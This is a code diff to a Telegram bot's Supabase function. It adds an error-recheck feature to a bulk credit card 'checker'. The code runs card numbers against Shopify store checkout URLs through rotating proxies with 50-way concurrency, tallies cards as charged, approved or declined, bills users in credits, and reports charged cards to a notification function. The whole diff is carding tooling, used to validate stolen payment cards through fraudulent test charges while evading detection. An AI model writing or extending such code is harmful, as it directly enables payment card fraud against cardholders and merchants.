@@ -6123,9 +6123,54 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         await supabase.from("pending_bulk_checks").delete().eq("id", stopBulkId);
         await answerCallbackQuery(update.callback_query.id, "🛑 Stopping...");
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
-      }
+       }
 
-      if (callbackData.startsWith("mtxt_") && !callbackData.startsWith("mtxt_nosite") && !callbackData.startsWith("mtxt_pending") && !callbackData.startsWith("mtxt_res_")) {
+       // MTXT Recheck errors handler - redirects error cards back through the price selection flow
+       if (callbackData.startsWith("mtxt_rechk_")) {
+         const rechkBulkId = callbackData.replace("mtxt_rechk_", "");
+         const rechkKey = `rechk_${rechkBulkId}`;
+         const { data: rechkData } = await supabase.from("pending_bulk_checks").select("cards, user_id").eq("id", rechkKey).maybeSingle();
+         if (!rechkData || !rechkData.cards) {
+           await answerCallbackQuery(update.callback_query.id, "❌ No error cards found");
+           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+         }
+         const rechkCards = rechkData.cards.split("\n").filter((c: string) => c.trim());
+         // Delete old recheck record and create new bulk check record
+         await supabase.from("pending_bulk_checks").delete().eq("id", rechkKey);
+         const newBulkId = crypto.randomUUID().slice(0, 8);
+         await supabase.from("pending_bulk_checks").insert({ id: newBulkId, cards: rechkCards.join("\n"), chat_id: String(callbackChatId), user_id: rechkData.user_id });
+
+         // Fetch the user profile for balance display
+         const { data: rechkProfile } = await supabase.from("profiles").select("credits").eq("user_id", rechkData.user_id).single();
+
+         // Show price group selection for the recheck
+         const rechkPriceGroups = [
+           { min: 0, max: 5, label: '$1 - $5', emoji: '💵' },
+           { min: 5, max: 20, label: '$5 - $20', emoji: '💰' },
+           { min: 20, max: 50, label: '$20 - $50', emoji: '💎' },
+           { min: 50, max: 100, label: '$50 - $100', emoji: '🏆' },
+         ];
+         const rechkGroupCounts = await Promise.all(
+           rechkPriceGroups.map(async (g) => {
+             let q = supabase.from("gateway_urls").select("id", { count: "exact", head: true }).not("url", "like", "https://razorpay.me/%").gt("price", g.min).lte("price", g.max);
+             const { count } = await q;
+             return { ...g, count: count || 0 };
+           })
+         );
+         const rechkTotalSites = rechkGroupCounts.reduce((a, g) => a + g.count, 0);
+         const rechkButtons: any[][] = [];
+         for (const g of rechkGroupCounts) {
+           if (g.count > 0) rechkButtons.push([{ text: `${g.emoji} ${g.label}  •  ${g.count} sites`, callback_data: `mtxt_${g.min}_${g.max}_${newBulkId}` }]);
+           else rechkButtons.push([{ text: `${g.emoji} ${g.label}  •  0 sites ✖️`, callback_data: `mtxt_nosite` }]);
+         }
+         rechkButtons.push([{ text: `🎲 𝗔𝘂𝘁𝗼 – Any Range  •  ${rechkTotalSites} sites`, callback_data: `mtxt_0_100_${newBulkId}` }]);
+
+         await answerCallbackQuery(update.callback_query.id, `🔄 Rechecking ${rechkCards.length} error cards...`);
+         await editTelegramMessage(callbackChatId, messageId, `🔄 <b>𝗥𝗘𝗖𝗛𝗘𝗖𝗞 𝗘𝗥𝗥𝗢𝗥 𝗖𝗔𝗥𝗗𝗦</b>\n\n📊 <b>${rechkCards.length} cards</b> to recheck\n💰 <b>Balance:</b> ${rechkProfile?.credits ?? '?'} credits\n🌐 <b>Sites:</b> ${rechkTotalSites} available\n\n<i>Select price range:</i>`, { inline_keyboard: rechkButtons });
+         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+       }
+
+       if (callbackData.startsWith("mtxt_") && !callbackData.startsWith("mtxt_nosite") && !callbackData.startsWith("mtxt_pending") && !callbackData.startsWith("mtxt_res_")) {
         const mtxtParts = callbackData.replace("mtxt_", "").split("_");
         const mtxtPriceMin = parseInt(mtxtParts[0]);
         const mtxtPriceMax = parseInt(mtxtParts[1]);
@@ -6297,91 +6342,98 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return result;
         };
 
-        // Check a single card with site/proxy rotation
-        const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
-          const shuffledProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
-          if (shuffledProxies.length === 0) return { status: 'unknown', response: 'No proxies', price: '$0.00' };
-          const maxSites = Math.min(5, mtxtAvailableSites.length);
-          for (let si = 0; si < maxSites; si++) {
-            const site = mtxtAvailableSites[si % mtxtAvailableSites.length];
-            for (const proxy of shuffledProxies) {
-              if (mtxtFailedProxyIds.includes(proxy.id)) continue;
-              const result = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
-              if (result.proxyDead) {
-                mtxtFailedProxyIds.push(proxy.id);
-                supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
-                continue;
-              }
-              if (result.siteDead) {
-                supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
-                break;
-              }
-              if (result.status === 'live' || result.status === 'dead') {
-                return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
-              }
-              // On unknown, try next site instead of returning immediately
-              break;
-            }
-          }
-          return { status: 'unknown', response: 'All attempts failed', price: '$0.00' };
-        };
+         // Check a single card with site/proxy rotation - try ALL combos before giving up
+         const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
+           const shuffledProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
+           if (shuffledProxies.length === 0) return { status: 'error', response: 'No proxies', price: '$0.00' };
+           const maxSites = Math.min(5, mtxtAvailableSites.length);
+           let lastResponse = 'All attempts failed';
+           for (let si = 0; si < maxSites; si++) {
+             const site = mtxtAvailableSites[si % mtxtAvailableSites.length];
+             for (const proxy of shuffledProxies) {
+               if (mtxtFailedProxyIds.includes(proxy.id)) continue;
+               const result = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
+               if (result.proxyDead) {
+                 mtxtFailedProxyIds.push(proxy.id);
+                 supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
+                 continue;
+               }
+               if (result.siteDead) {
+                 supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
+                 break; // skip to next site
+               }
+               if (result.status === 'live' || result.status === 'dead') {
+                 return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
+               }
+               // unknown - save response and try next proxy
+               lastResponse = result.response || result.message || 'Unknown';
+             }
+           }
+           return { status: 'error', response: lastResponse, price: '$0.00' };
+         };
 
-        // Results array
-        interface MtxtResult { cc: string; status: string; response: string; price: string; bank: string; flag: string; }
-        const mtxtResults: MtxtResult[] = [];
-        let mtxtCharged = 0, mtxtApproved = 0, mtxtDeclined = 0;
-        let mtxtTotalCost = 0;
+         // Results array
+         interface MtxtResult { cc: string; status: string; response: string; price: string; bank: string; flag: string; }
+         const mtxtResults: MtxtResult[] = [];
+         let mtxtCharged = 0, mtxtApproved = 0, mtxtDeclined = 0, mtxtErrorCount = 0;
+         let mtxtTotalCost = 0;
+         const mtxtErrorCards: string[] = []; // Track cards that got errors for recheck
 
-        // Build live update message + result buttons showing ALL cards
-        const mtxtAnimFrames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
-        let mtxtAnimIdx = 0;
-        const mtxtCheckingSpinners = ['🔄', '🔃', '⚡', '🔄'];
+         // Build live update message + result buttons
+         const mtxtAnimFrames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
+         let mtxtAnimIdx = 0;
 
-        // Track per-card status: 'waiting' | 'checking' | done result
-        let mtxtCurrentCard = '—';
-        let mtxtLastResponse = '—';
-        let mtxtStopped = false;
-        const mtxtStopKey = `mtxt_stop_${mtxtBulkId}`;
+         // Track per-card status
+         let mtxtCurrentCard = '—';
+         let mtxtLastResponse = '—';
+         let mtxtStopped = false;
+         const mtxtStopKey = `mtxt_stop_${mtxtBulkId}`;
 
-        const buildMtxtMessageAndButtons = (checked: number, total: number, elapsed: string, isComplete: boolean) => {
-          const progressPct = total > 0 ? Math.round((checked / total) * 100) : 0;
-          const filledBlocks = Math.round(progressPct / 5);
-          const progressBar = '█'.repeat(filledBlocks) + '░'.repeat(20 - filledBlocks);
-          const spinner = isComplete ? '✅' : mtxtAnimFrames[mtxtAnimIdx++ % mtxtAnimFrames.length];
+         const buildMtxtMessageAndButtons = (checked: number, total: number, elapsed: string, isComplete: boolean) => {
+           const progressPct = total > 0 ? Math.round((checked / total) * 100) : 0;
+           const filledBlocks = Math.round(progressPct / 5);
+           const progressBar = '█'.repeat(filledBlocks) + '░'.repeat(20 - filledBlocks);
+           const spinner = isComplete ? '✅' : mtxtAnimFrames[mtxtAnimIdx++ % mtxtAnimFrames.length];
 
-          let msg = `📄 <b>𝗧𝗫𝗧 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>\n\n`;
-          msg += `${spinner} <code>[${progressBar}]</code> <b>${progressPct}%</b>\n`;
-          msg += `📊 <b>${checked}/${total}</b> checked  ⏱ <b>${elapsed}s</b>\n`;
-          if (mtxtStopped) msg += `\n🛑 <b>STOPPED BY USER</b>\n`;
-          if (isComplete && !mtxtStopped) msg += `\n✅ <b>Process Completed</b>\n`;
+           let msg = `📄 <b>𝗧𝗫𝗧 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>\n\n`;
+           msg += `${spinner} <code>[${progressBar}]</code> <b>${progressPct}%</b>\n`;
+           msg += `📊 <b>${checked}/${total}</b> checked  ⏱ <b>${elapsed}s</b>\n`;
+           if (mtxtStopped) msg += `\n🛑 <b>STOPPED BY USER</b>\n`;
+           if (isComplete && !mtxtStopped) msg += `\n✅ <b>Process Completed</b>\n`;
 
-          // 6-button layout
-          const buttons: any[][] = [];
-          // Row 1: Card Number
-          const cardDisplay = mtxtCurrentCard !== '—' ? (() => {
-            const num = mtxtCurrentCard.split('|')[0];
-            return `${num.slice(0, 6)}****${num.slice(-4)}`;
-          })() : '—';
-          buttons.push([{ text: `💳 ${cardDisplay}`, callback_data: 'mtxt_pending' }]);
-          // Row 2: Response
-          const respText = mtxtLastResponse.length > 35 ? mtxtLastResponse.slice(0, 35) + '…' : mtxtLastResponse;
-          buttons.push([{ text: `📝 ${respText}`, callback_data: 'mtxt_pending' }]);
-          // Row 3: Charged + Declined
-          buttons.push([
-            { text: `💎 Charged: ${mtxtCharged}`, callback_data: 'mtxt_pending' },
-            { text: `❌ Declined: ${mtxtDeclined}`, callback_data: 'mtxt_pending' },
-          ]);
-          // Row 4: Progress
-          buttons.push([{ text: `📊 Progress: ${checked}/${total} (${progressPct}%)`, callback_data: 'mtxt_pending' }]);
-          // Row 5: Stop or Back
-          if (isComplete || mtxtStopped) {
-            buttons.push([{ text: '🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂', callback_data: 'menu_back' }]);
-          } else {
-            buttons.push([{ text: '🛑 Stop', callback_data: mtxtStopKey }]);
-          }
+           // 6-button layout
+           const buttons: any[][] = [];
+           // Row 1: Card Number
+           const cardDisplay = mtxtCurrentCard !== '—' ? (() => {
+             const num = mtxtCurrentCard.split('|')[0];
+             return `${num.slice(0, 6)}****${num.slice(-4)}`;
+           })() : '—';
+           buttons.push([{ text: `💳 ${cardDisplay}`, callback_data: 'mtxt_pending' }]);
+           // Row 2: Response
+           const respText = mtxtLastResponse.length > 35 ? mtxtLastResponse.slice(0, 35) + '…' : mtxtLastResponse;
+           buttons.push([{ text: `📝 ${respText}`, callback_data: 'mtxt_pending' }]);
+           // Row 3: Charged + Declined
+           buttons.push([
+             { text: `💎 Charged: ${mtxtCharged}`, callback_data: 'mtxt_pending' },
+             { text: `❌ Declined: ${mtxtDeclined}`, callback_data: 'mtxt_pending' },
+           ]);
+           // Row 4: Errors + Progress
+           buttons.push([
+             { text: `⚠️ Errors: ${mtxtErrorCount}`, callback_data: 'mtxt_pending' },
+             { text: `📊 ${checked}/${total} (${progressPct}%)`, callback_data: 'mtxt_pending' },
+           ]);
+           // Row 5: Stop / Recheck Errors / Back
+           if (isComplete || mtxtStopped) {
+             if (mtxtErrorCards.length > 0) {
+               buttons.push([{ text: `🔄 Recheck ${mtxtErrorCards.length} Errors`, callback_data: `mtxt_rechk_${mtxtBulkId}` }]);
+             }
+             buttons.push([{ text: '🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂', callback_data: 'menu_back' }]);
+           } else {
+             buttons.push([{ text: '🛑 Stop', callback_data: mtxtStopKey }]);
+           }
 
-          return { msg, buttons };
-        };
+           return { msg, buttons };
+         };
 
          // 50-thread concurrency with staggered launches like web Shopify gateway
          const MTXT_CONCURRENCY = 50;
@@ -6433,29 +6485,32 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
              mtxtCheckCard(cardCC)
            ]);
 
-           let statusType: string;
-           const respLower = (result.response || '').toLowerCase();
-           if (result.status === 'live') {
-             if (respLower.includes('order_completed') || respLower.includes('order completed')) { mtxtCharged++; statusType = 'live'; }
-             else { mtxtApproved++; statusType = 'approved'; }
-           } else if (result.status === 'dead') {
-             mtxtDeclined++; statusType = 'dead';
-           } else {
-             if (respLower.includes('3ds') || respLower.includes('otp') || respLower.includes('required')) { mtxtApproved++; statusType = 'approved'; }
-             else { mtxtDeclined++; statusType = 'dead'; }
-           }
+            let statusType: string;
+            const respLower = (result.response || '').toLowerCase();
+            if (result.status === 'live') {
+              if (respLower.includes('order_completed') || respLower.includes('order completed')) { mtxtCharged++; statusType = 'live'; }
+              else { mtxtApproved++; statusType = 'approved'; }
+            } else if (result.status === 'dead') {
+              mtxtDeclined++; statusType = 'dead';
+            } else if (result.status === 'error') {
+              mtxtErrorCount++; statusType = 'error';
+              mtxtErrorCards.push(cardCC);
+            } else {
+              if (respLower.includes('3ds') || respLower.includes('otp') || respLower.includes('required')) { mtxtApproved++; statusType = 'approved'; }
+              else { mtxtErrorCount++; statusType = 'error'; mtxtErrorCards.push(cardCC); }
+            }
 
-           let cardCost = 0;
-           if (result.status === 'live') cardCost = 2;
-           else if (result.status === 'dead') cardCost = 1;
-           mtxtTotalCost += cardCost;
+            let cardCost = 0;
+            if (result.status === 'live') cardCost = 2;
+            else if (result.status === 'dead') cardCost = 1;
+            // No cost for error cards
+            mtxtTotalCost += cardCost;
 
-           if (cardCost > 0) {
-             await supabase.from("profiles").update({ credits: mtxtProfile.credits - mtxtTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mtxtProfile.user_id);
-             await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
-           } else {
-             await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: "unknown" });
-           }
+            if (result.status === 'live' || result.status === 'dead') {
+              await supabase.from("profiles").update({ credits: mtxtProfile.credits - mtxtTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mtxtProfile.user_id);
+              await supabase.from("card_checks").insert({ user_id: mtxtProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
+            }
+            // Don't insert error cards into card_checks - they'll be rechecked
 
            if (result.status === 'live' && SUPABASE_SERVICE_ROLE_KEY) {
              fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
@@ -6517,22 +6572,27 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           }
         }
 
-        // Cleanup stop tracker
-        await supabase.from("pending_bulk_checks").delete().eq("id", mtxtBulkId);
+         // Cleanup stop tracker and store error cards for recheck
+         await supabase.from("pending_bulk_checks").delete().eq("id", mtxtBulkId);
+         if (mtxtErrorCards.length > 0) {
+           // Store error cards for recheck using same bulk ID
+           await supabase.from("pending_bulk_checks").insert({ id: `rechk_${mtxtBulkId}`, cards: mtxtErrorCards.join("\n"), chat_id: String(callbackChatId), user_id: mtxtProfile.user_id });
+         }
 
-        // Final message with buttons
-        const mtxtElapsed = ((Date.now() - mtxtStartTime) / 1000).toFixed(2);
-        const { data: mtxtUpdatedProfile } = await supabase.from("profiles").select("credits").eq("user_id", mtxtProfile.user_id).single();
-        const mtxtNewBalance = mtxtUpdatedProfile?.credits ?? (mtxtProfile.credits - mtxtTotalCost);
+         // Final message with buttons
+         const mtxtElapsed = ((Date.now() - mtxtStartTime) / 1000).toFixed(2);
+         const { data: mtxtUpdatedProfile } = await supabase.from("profiles").select("credits").eq("user_id", mtxtProfile.user_id).single();
+         const mtxtNewBalance = mtxtUpdatedProfile?.credits ?? (mtxtProfile.credits - mtxtTotalCost);
 
-        const finalData = buildMtxtMessageAndButtons(mtxtChecked, mtxtCards.length, mtxtElapsed, true);
-        let mtxtFinalMsg = finalData.msg;
-        mtxtFinalMsg += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-        mtxtFinalMsg += mtxtStopped ? `🛑 <b>Stopped</b> — ${mtxtChecked}/${mtxtCards.length} checked\n` : `✅ <b>Process Completed</b>\n`;
-        mtxtFinalMsg += `💰 Cost: <b>-${mtxtTotalCost}</b> credits ・ Balance: <b>${mtxtNewBalance}</b>`;
-        if (mtxtFailedProxyIds.length > 0) mtxtFinalMsg += `\n🔴 <b>${mtxtFailedProxyIds.length} dead proxy removed</b>`;
+         const finalData = buildMtxtMessageAndButtons(mtxtChecked, mtxtCards.length, mtxtElapsed, true);
+         let mtxtFinalMsg = finalData.msg;
+         mtxtFinalMsg += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
+         mtxtFinalMsg += mtxtStopped ? `🛑 <b>Stopped</b> — ${mtxtChecked}/${mtxtCards.length} checked\n` : `✅ <b>Process Completed</b>\n`;
+         mtxtFinalMsg += `💰 Cost: <b>-${mtxtTotalCost}</b> credits ・ Balance: <b>${mtxtNewBalance}</b>`;
+         if (mtxtErrorCards.length > 0) mtxtFinalMsg += `\n⚠️ <b>${mtxtErrorCards.length} cards</b> had errors — tap Recheck to retry`;
+         if (mtxtFailedProxyIds.length > 0) mtxtFinalMsg += `\n🔴 <b>${mtxtFailedProxyIds.length} dead proxy removed</b>`;
 
-        await editTelegramMessage(callbackChatId, messageId, mtxtFinalMsg, { inline_keyboard: finalData.buttons });
+         await editTelegramMessage(callbackChatId, messageId, mtxtFinalMsg, { inline_keyboard: finalData.buttons });
 
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
